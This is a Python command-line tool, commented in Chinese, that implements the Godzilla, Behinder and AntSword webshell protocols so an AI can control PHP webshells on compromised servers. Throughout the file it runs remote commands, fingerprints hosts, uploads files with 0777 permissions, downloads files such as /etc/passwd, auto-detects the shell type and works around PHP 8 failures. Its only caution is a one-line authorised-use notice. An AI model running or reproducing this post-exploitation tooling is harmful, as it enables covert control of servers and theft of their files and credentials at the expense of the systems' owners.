#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WebShell 管理 CLI —— 直接实现蚁剑 / 冰蝎 / 哥斯拉 三种协议，操作 PHP webshell。

为什么需要这个工具
------------------
蚁剑、冰蝎、哥斯拉都是图形化程序，AI 驱动不了它们。但「WebShell 管理」这件事
的本质是**按约定的协议发 HTTP 请求**——而这三种协议都是公开可实现的。本 CLI
实现协议本身，于是这件事对 AI 就从「不可调用」变成「可调用」。

这与 Burp 走官方 MCP 是同一个思路：绕开 GUI，直接接协议。

支持的协议
----------
  godzilla   哥斯拉 phpXor（异或 + session 投递载荷）
  behinder   冰蝎 v4（AES）
  antsword   蚁剑（默认编码器）

用法
----
  # 哥斯拉：需要生成 shell 时的 16 字节密钥
  webshell_cli.py -u http://t/shell.php -p pass -t godzilla --key 0123456789abcdef -c "id"

  # 冰蝎 / 蚁剑：只要地址和密码
  webshell_cli.py -u http://t/shell.php -p pass -t behinder -c "whoami"
  webshell_cli.py -u http://t/shell.php -p pass -t antsword -c "ls -la"

  webshell_cli.py -u ... -p pass -t godzilla --key K --info      # 探服务器信息
  webshell_cli.py -u ... -p pass -t godzilla --key K --shell     # 交互式
  webshell_cli.py --list-types

授权提醒
--------
仅可用于你拥有明确授权的目标。未授权访问他人系统违法。
"""
import argparse
import base64
import gzip
import hashlib
import json
import os
import secrets
import sys

try:
    import requests
except ImportError:
    sys.stderr.write("[错误] 缺少 requests。装它：tools/_venv/bin/pip install requests\n")
    sys.exit(1)

HERE = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.join(HERE, "payloads")

TIMEOUT = 20
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"


class ShellError(Exception):
    """连接或协议层面的错误，用于把底层异常转成可读的提示。"""


# --------------------------------------------------------------------------
# 协议基类
# --------------------------------------------------------------------------
class BaseShell:
    name = ""
    needs_key = False

    def __init__(self, url, password, key=None, timeout=TIMEOUT, **kw):
        self.url = url
        self.password = password
        self.key = key
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        self._ready = False

    def _post(self, body, headers=None):
        try:
            r = self.session.post(self.url, data=body, headers=headers or {},
                                  timeout=self.timeout, allow_redirects=True)
        except requests.RequestException as e:
            raise ShellError(f"请求失败: {type(e).__name__}: {e}")
        if r.status_code != 200:
            raise ShellError(f"HTTP {r.status_code}（期望 200；404 说明路径不对，"
                             f"403 可能被 WAF 拦了）")
        return r.content

    def ensure(self):
        """首次使用前的握手（幂等）。"""
        if not self._ready:
            self.handshake()
            self._ready = True

    def handshake(self):
        raise NotImplementedError

    def exec(self, command):
        raise NotImplementedError

    def info(self):
        raise NotImplementedError

    # ---- 文件读写 --------------------------------------------------------
    # 有原生文件 API 的协议（哥斯拉）覆盖下面两个；其余走基于命令通道的
    # 通用实现。generic 版依赖目标机的 base64 命令，且会把文件内容完整
    # 过一遍命令行，因此只适合中小文件——不适用时请用原生实现或图形客户端。

    def upload(self, local, remote):
        try:
            with open(local, "rb") as f:
                data = f.read()
        except OSError as e:
            raise ShellError(f"读取本地文件失败: {e}")
        b64 = base64.b64encode(data).decode("ascii")
        q = _sh_quote(remote)
        chunk = 60000
        if self.exec(f"printf '%s' '{b64[:chunk]}' | base64 -d > {q}").strip():
            pass
        for i in range(chunk, len(b64), chunk):
            self.exec(f"printf '%s' '{b64[i:i+chunk]}' | base64 -d >> {q}")
        return len(data)

    def download(self, remote, local):
        q = _sh_quote(remote)
        raw = self.exec(f"base64 -w 0 {q} 2>/dev/null || base64 {q}")
        b64 = "".join(raw.split())
        if not b64:
            raise ShellError("下载失败：目标没返回内容"
                             "（文件不存在、不可读，或目标机没有 base64 命令）")
        try:
            data = base64.b64decode(b64, validate=False)
        except Exception as e:
            raise ShellError(f"下载失败：返回内容不是 base64（{e}）")
        try:
            with open(local, "wb") as f:
                f.write(data)
        except OSError as e:
            raise ShellError(f"写入本地文件失败: {e}")
        return len(data)


# --------------------------------------------------------------------------
# 哥斯拉 phpXor
# --------------------------------------------------------------------------
class GodzillaShell(BaseShell):
    """哥斯拉 phpXor 协议。

    服务端 shell 里内建的加解密（直接取自生成的 shell，未做改动）：

        function encode($D,$K){
            for($i=0;$i<strlen($D);$i++) {
                $c = $K[$i+1&15];          // PHP 里 & 优先级低于 + ⇒ key[(i+1) % 16]
                $D[$i] = $D[$i]^$c;
            }
        }

    请求：POST pass=base64( xor(载荷, key) )
    响应：md5(pass+key) 的前 16 位 + base64(xor(结果, key)) + 后 16 位

    载荷有两种：首次投递的「服务端 payload」（整份 PHP 源码，shell 会存进
    session 并在后续请求里 eval），以及后续的参数包。
    """

    name = "godzilla"
    needs_key = True

    # 参数包编码：key + \x02 + uint32_le(值长度) + 值
    # 长度是小端——服务端 payload.php 里的 bytesToInteger 把 $bytes[position]
    # 当最低位。写成大端会导致除长度为 0 的参数外全部解析错位。
    SEP = b"\x02"

    @property
    def _xor_key(self):
        return self.key.encode()

    def _xor(self, data):
        k = self._xor_key
        return bytes(b ^ k[(i + 1) & 15] for i, b in enumerate(data))

    def _pack(self, params):
        out = b""
        for k, v in params.items():
            vb = v.encode() if isinstance(v, str) else v
            out += k.encode() + self.SEP + len(vb).to_bytes(4, "little") + vb
        return out

    def _send(self, body):
        encoded = base64.b64encode(self._xor(body)).decode()
        # 必须 URL 编码：base64 里的 '+' 在 x-www-form-urlencoded 里会被解成空格，
        # 密文一坏，握手会静默失败（服务端什么都不回）。
        return self._post({self.password: encoded})

    def _wrapper(self):
        h = hashlib.md5((self.password + self.key).encode()).hexdigest()
        return h[:16].encode(), h[16:].encode()

    def _parse(self, resp):
        pre, suf = self._wrapper()
        if not resp.startswith(pre) or not resp.endswith(suf):
            raise ShellError(
                "响应外壳不匹配——密码或密钥不对，或目标不是哥斯拉 phpXor 型 shell。"
                f"（收到 {len(resp)} 字节，开头 {resp[:32]!r}）")
        raw = self._xor(base64.b64decode(resp[len(pre):-len(suf)]))
        # 服务端 payload.php 里 canCallGzipEncode() 成立时会 gzip 压缩结果
        if raw[:2] == b"\x1f\x8b":
            try:
                raw = gzip.decompress(raw)
            except OSError:
                pass
        return raw

    def _payload_source(self):
        p = os.path.join(PAYLOAD_DIR, "godzilla_php_xor.php")
        if not os.path.exists(p):
            raise ShellError(f"缺少服务端 payload 文件: {p}")
        with open(p, encoding="utf-8") as f:
            return f.read()

    def handshake(self):
        """把服务端 payload 投进 session。

        shell 只在首次请求里存载荷（判据是内容含 getBasicsInfo），且**不回显**，
        所以这里无法从响应判断成功与否——真正的判据是随后第一次 exec 能否拿到
        正常结果。
        """
        src = self._payload_source()
        if "getBasicsInfo" not in src:
            raise ShellError("服务端 payload 缺少 getBasicsInfo 标记，无法完成握手")
        self._send(src.encode())

    def _call(self, method, **params):
        self.ensure()
        packet = {"codeName": "", "methodName": method}
        packet.update(params)
        return self._parse(self._send(self._pack(packet)))

    def exec(self, command):
        out = self._call("execCommand", cmdLine=command)
        text = out.decode("utf-8", errors="replace")
        # 服务端拿不到函数时会回 "function xxx not exist"，这不是命令输出
        if text.startswith("function ") and "not exist" in text:
            raise ShellError(f"目标 shell 未加载执行模块: {text.strip()}")
        return text

    def info(self):
        return self._call("getBasicsInfo").decode("utf-8", errors="replace")

    def upload(self, local, remote):
        """把本地文件写到目标机。服务端 uploadFile 会把权限设成 0777。"""
        try:
            with open(local, "rb") as f:
                data = f.read()
        except OSError as e:
            raise ShellError(f"读取本地文件失败: {e}")
        out = self._call("uploadFile", fileName=remote, fileValue=data)
        text = out.decode("utf-8", errors="replace").strip()
        if text != "ok":
            raise ShellError(f"上传失败，服务端返回: {text!r}"
                             f"（常见原因：目录不存在或不可写）")
        return len(data)

    def download(self, remote, local):
        """把目标机的文件读回本地。服务端 readFileContent 返回的是原始字节。

        注意它把「文件不存在」和「无权限」也当正常结果返回，这里要识别出来，
        否则会把一句错误提示当成文件内容写进本地。
        """
        data = self._call("readFileContent", fileName=remote)
        text = data.decode("utf-8", errors="replace").strip()
        if len(data) < 64 and text in ("File Not Found", "No Permission!"):
            raise ShellError(f"下载失败: {text}")
        try:
            with open(local, "wb") as f:
                f.write(data)
        except OSError as e:
            raise ShellError(f"写入本地文件失败: {e}")
        return len(data)


# --------------------------------------------------------------------------
# 冰蝎 Behinder v4
# --------------------------------------------------------------------------
class BehinderShell(BaseShell):
    """冰蝎 v4 PHP 型。

    加解密细节都在同目录的 `behinder_php.py` 里（那份实现的每条结论都标注了
    出自 jar 里哪个类/资源）。这里只做适配与降级处理。

    一个真实的坑：冰蝎的载荷外壳写作 `assert|eval(...)`，靠的是 PHP 8 之前
    「未定义常量当字符串用」的老行为。**PHP 8 起这是致命错误**，表现为响应
    完全空白、握手静默失败。补丁可以打在服务端 shell 里，但真实场景用的是
    别人已经上传好的 shell，改不了——所以这里走**客户端**降级：标准外壳连不上
    就换成 `define("assert",0);` 前缀重试，一个字节都不用动目标。
    """

    name = "behinder"
    needs_key = False

    def __init__(self, url, password, key=None, timeout=TIMEOUT, **kw):
        super().__init__(url, password, key, timeout, **kw)
        try:
            import behinder_php as B
        except ImportError as e:
            raise ShellError(
                f"缺少冰蝎协议实现（behinder_php.py）或其依赖: {e}\n"
                f"      它依赖 pycryptodome，装：tools/_venv/bin/pip install pycryptodome")
        self.B = B
        self.impl = B.BehinderPhpShell(url, password, timeout=timeout)
        self.php8_fallback = False

    def _try_connect(self):
        try:
            return bool(self.impl.connect())
        except Exception:
            return False

    def handshake(self):
        if self._try_connect():
            return
        # PHP 8 会因 assert 未定义而致命错误，换兼容前缀再来一次。
        # 注意必须**整个重建** impl：上面那次失败的 connect() 内部已经把协议
        # 降级成 default_xor_base64 了，直接在原对象上改前缀会变成
        # 「XOR + 新前缀」，照样连不上。
        impl = self.B.BehinderPhpShell(self.url, self.password, timeout=self.timeout)
        impl.payload_prefix = self.B.PHP8_PAYLOAD_PREFIX
        self.impl = impl
        if self._try_connect():
            self.php8_fallback = True
            return
        raise ShellError(
            "冰蝎握手失败。可能原因：密码不对；目标不是冰蝎 PHP shell；"
            "目标不是 PHP；或该 shell 用了非 default_aes/default_xor_base64 的协议")

    def _msg(self, result):
        msg = result.get("msg", "") if isinstance(result, dict) else str(result)
        if result.get("status") not in (None, "", "success"):
            raise ShellError(f"目标返回失败状态: {result.get('status')} / {msg}")
        return msg

    def exec(self, command):
        self.ensure()
        return self._msg(self.impl.run_cmd(command))

    def info(self):
        self.ensure()
        msg = self._msg(self.impl.basic_info())
        # BasicInfo 返回的 msg 是一段 JSON，每个字段各自又 base64 了一层。
        # 其中 basicInfo 是整个 phpinfo 页面的 HTML（动辄上百 KB），直接打出来
        # 没法看，所以这里只留摘要。
        try:
            inner = json.loads(msg)
        except Exception:
            return msg
        lines = []
        for k, v in inner.items():
            try:
                v = base64.b64decode(v).decode("utf-8", "replace")
            except Exception:
                pass
            if k == "basicInfo":
                if len(v) > 200:
                    v = f"（phpinfo HTML，{len(v)} 字符，已略）"
            lines.append(f"{k:12s}: {v}")
        return "\n".join(lines)


# --------------------------------------------------------------------------
# 自动识别
# --------------------------------------------------------------------------
class AutoShell(BaseShell):
    """挨个协议试，挑第一个能连上的。

    实际意义：拿到一个 webshell 时，往往不知道它是哪个工具生成的。逐个手试
    要跑三遍命令；这里一次搞定。注意它会**向目标发若干次探测请求**——在授权
    测试里无所谓，但要心里有数。
    """

    name = "auto"
    needs_key = False

    #: 探测顺序。哥斯拉要密钥，只有给了 --key 才纳入候选。
    ORDER = ["godzilla", "behinder", "antsword"]

    def __init__(self, url, password, key=None, timeout=TIMEOUT, **kw):
        super().__init__(url, password, key, timeout)
        self.detected = None
        self.impl = None
        self.kw = kw

    def handshake(self):
        tried = []
        for name in self.ORDER:
            cls = SHELL_TYPES.get(name)
            if cls is None or cls is AutoShell:
                continue
            if cls.needs_key and not self.key:
                tried.append(f"{name}(需要 --key，已跳过)")
                continue
            try:
                sh = cls(self.url, self.password, self.key,
                         timeout=self.timeout, **self.kw)
                sh.ensure()
                self.impl, self.detected = sh, name
                return
            except Exception as e:
                tried.append(f"{name}({str(e)[:50]})")
        raise ShellError(
            "自动识别失败——三种协议都连不上。逐个试的结果：\n      "
            + "\n      ".join(tried)
            + "\n      提示：哥斯拉型需要 --key；密码错误也会是这个结果。")

    def exec(self, command):
        self.ensure()
        return self.impl.exec(command)

    def info(self):
        self.ensure()
        return self.impl.info()

    def upload(self, local, remote):
        self.ensure()
        return self.impl.upload(local, remote)

    def download(self, remote, local):
        self.ensure()
        return self.impl.download(remote, local)


# --------------------------------------------------------------------------
# 蚁剑 AntSword
# --------------------------------------------------------------------------
class AntSwordShell(BaseShell):
    """蚁剑。

    协议特征（与另两家明显不同）：
      * 参数名每次请求都随机生成，且和响应里的标记成对出现——响应被一对随机
        标记夹着，客户端靠它从混杂输出里切出命令结果；
      * 载荷模板较长（约 3KB），随每次请求一起发；
      * 默认编码器下命令以 base64 分片塞进随机命名的参数里。

    协议实现在同目录的 `antsword_php.py`。它只依赖标准库，不需要 pycryptodome。
    """

    name = "antsword"
    needs_key = False

    def __init__(self, url, password, key=None, timeout=TIMEOUT,
                 encoder="default", decoder="default", **kw):
        super().__init__(url, password, key, timeout)
        try:
            import antsword_php as A
        except ImportError as e:
            raise ShellError(f"缺少蚁剑协议实现（antsword_php.py）: {e}")
        self.A = A
        if encoder not in A.ENCODERS:
            raise ShellError(f"未知编码器 {encoder!r}，可用: {'、'.join(A.ENCODERS)}")
        if decoder not in A.DECODERS:
            raise ShellError(f"未知解码器 {decoder!r}，可用: {'、'.join(A.DECODERS)}")
        self.impl = A.AntSwordPHP(url, password, encoder=encoder, decoder=decoder)

    def _run(self, command):
        req = self.impl.build_request(command)
        try:
            r = self.session.post(req["url"], data=req["body"].encode("ascii"),
                                  headers=req["headers"], timeout=self.timeout)
        except requests.RequestException as e:
            raise ShellError(f"请求失败: {type(e).__name__}: {e}")
        if r.status_code != 200:
            raise ShellError(f"HTTP {r.status_code}（期望 200）")
        try:
            return self.impl.parse_response(r.text, req["tag_s"], req["tag_e"])
        except Exception as e:
            raise ShellError(
                f"响应解析失败——多半是密码不对，或目标不是蚁剑型 shell。"
                f"（{type(e).__name__}: {e}；响应开头 {r.text[:60]!r}）")

    def handshake(self):
        marker = "AS" + secrets.token_hex(6)
        if marker not in self._run(f"echo {marker}"):
            raise ShellError("蚁剑握手失败：回显与预期不符（密码不对或目标不是蚁剑 shell）")

    def exec(self, command):
        self.ensure()
        return self._run(command)

    def info(self):
        # 蚁剑没有像另两家那样的「取服务器信息」专有动作（它的信息面板走的是
        # 自己的 PHP 插件），这里用几条通用命令拼一份，够 AI 判断环境用。
        return self.exec("uname -a 2>/dev/null; echo ---; id 2>/dev/null; "
                         "echo ---; pwd; echo ---; php -v 2>/dev/null | head -1")


SHELL_TYPES = {
    "godzilla": GodzillaShell,
    "behinder": BehinderShell,
    "antsword": AntSwordShell,
    "auto": AutoShell,
}


def build(args):
    cls = SHELL_TYPES.get(args.type)
    if cls is None:
        sys.stderr.write(f"[错误] 未知协议: {args.type}\n"
                         f"       可用: {'、'.join(SHELL_TYPES)}\n")
        sys.exit(2)
    if cls.needs_key and not args.key:
        sys.stderr.write(f"[错误] {args.type} 需要 --key（生成 shell 时的密钥）\n")
        sys.exit(2)
    return cls(args.url, args.password, args.key, timeout=args.timeout,
               encoder=args.encoder, decoder=args.decoder)


def _sh_quote(path):
    """把路径安全地塞进 shell 命令（单引号包裹，内部单引号转义）。"""
    return "'" + str(path).replace("'", "'\\''") + "'"


def _split_pair(value, flag):
    """把「A:B」拆成 (A, B)。

    不能直接用 split(':', 1)：Windows 的本地路径 `C:\\x` 里那个冒号是盘符的一部分。
    这里跳过「第二个字符是冒号且后面跟斜杠」的那种情况。
    """
    if not value:
        return None
    for i, ch in enumerate(value):
        if ch != ":":
            continue
        if i == 1 and len(value) > 2 and value[2] in "\\/":
            continue                      # 盘符 C:\ 或 C:/
        return value[:i], value[i + 1:]
    raise ValueError(f"{flag} 要写成「本地:远程」的形式（收到 {value!r}）")


def print_out(text, as_json=False):
    if as_json:
        print(json.dumps({"ok": True, "output": text}, ensure_ascii=False))
    else:
        print(text if text.endswith("\n") else text + "\n", end="")


def main():
    ap = argparse.ArgumentParser(
        description="WebShell CLI：用蚁剑/冰蝎/哥斯拉的协议直接操作 PHP webshell",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("-u", "--url", help="webshell 地址")
    ap.add_argument("-p", "--password", help="连接密码")
    ap.add_argument("-t", "--type", default="godzilla",
                    help=f"协议类型，默认 godzilla；可选 {'、'.join(SHELL_TYPES)}")
    ap.add_argument("--key", help="哥斯拉专用：生成 shell 时的 16 字节密钥")
    ap.add_argument("--encoder", default="default",
                    help="蚁剑专用：请求编码器（default/base64/chr/chr16/rot13）")
    ap.add_argument("--decoder", default="default",
                    help="蚁剑专用：响应解码器（default/base64/rot13）")
    ap.add_argument("-c", "--cmd", help="要执行的命令")
    ap.add_argument("--info", action="store_true", help="探测目标服务器基础信息")
    ap.add_argument("--shell", action="store_true", help="进入交互模式")
    ap.add_argument("--upload", metavar="本地:远程",
                    help="上传文件，如 --upload ./x.php:/var/www/x.php")
    ap.add_argument("--download", metavar="远程:本地",
                    help="下载文件，如 --download /etc/passwd:./passwd.txt")
    ap.add_argument("--json", action="store_true", help="以 JSON 输出")
    ap.add_argument("--timeout", type=int, default=TIMEOUT, help="请求超时秒数")
    ap.add_argument("--list-types", action="store_true", help="列出支持的协议")
    args = ap.parse_args()

    if args.list_types:
        for n, c in SHELL_TYPES.items():
            print(f"  {n:10s} {'需要 --key' if c.needs_key else '只需密码'}")
        return 0

    if not args.url or not args.password:
        ap.error("需要 -u/--url 与 -p/--password")
    if not (args.cmd or args.info or args.shell or args.upload or args.download):
        ap.error("要指定动作：-c 执行命令 / --info 探信息 / --shell 交互 "
                 "/ --upload 上传 / --download 下载")

    try:
        up = _split_pair(args.upload, "--upload")
        down = _split_pair(args.download, "--download")
    except ValueError as e:
        ap.error(str(e))

    sh = build(args)
    try:
        if args.info:
            print_out(sh.info(), args.json)
        if args.cmd:
            print_out(sh.exec(args.cmd), args.json)
        if up:
            n = sh.upload(up[0], up[1])
            print_out(f"[OK] 已上传 {up[0]} → {up[1]}（{n} 字节）", args.json)
        if down:
            n = sh.download(down[0], down[1])
            print_out(f"[OK] 已下载 {down[0]} → {down[1]}（{n} 字节）", args.json)
        if args.shell:
            print(f"[已连接] {args.type} @ {args.url}（exit 退出）", file=sys.stderr)
            while True:
                try:
                    line = input("webshell> ").strip()
                except (EOFError, KeyboardInterrupt):
                    print(file=sys.stderr)
                    break
                if line.lower() in ("exit", "quit"):
                    break
                if not line:
                    continue
                try:
                    print_out(sh.exec(line), args.json)
                except ShellError as e:
                    print(f"[错误] {e}", file=sys.stderr)
    except ShellError as e:
        print(f"[错误] {e}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        return 130
    return 0


if __name__ == "__main__":
    sys.exit(main())
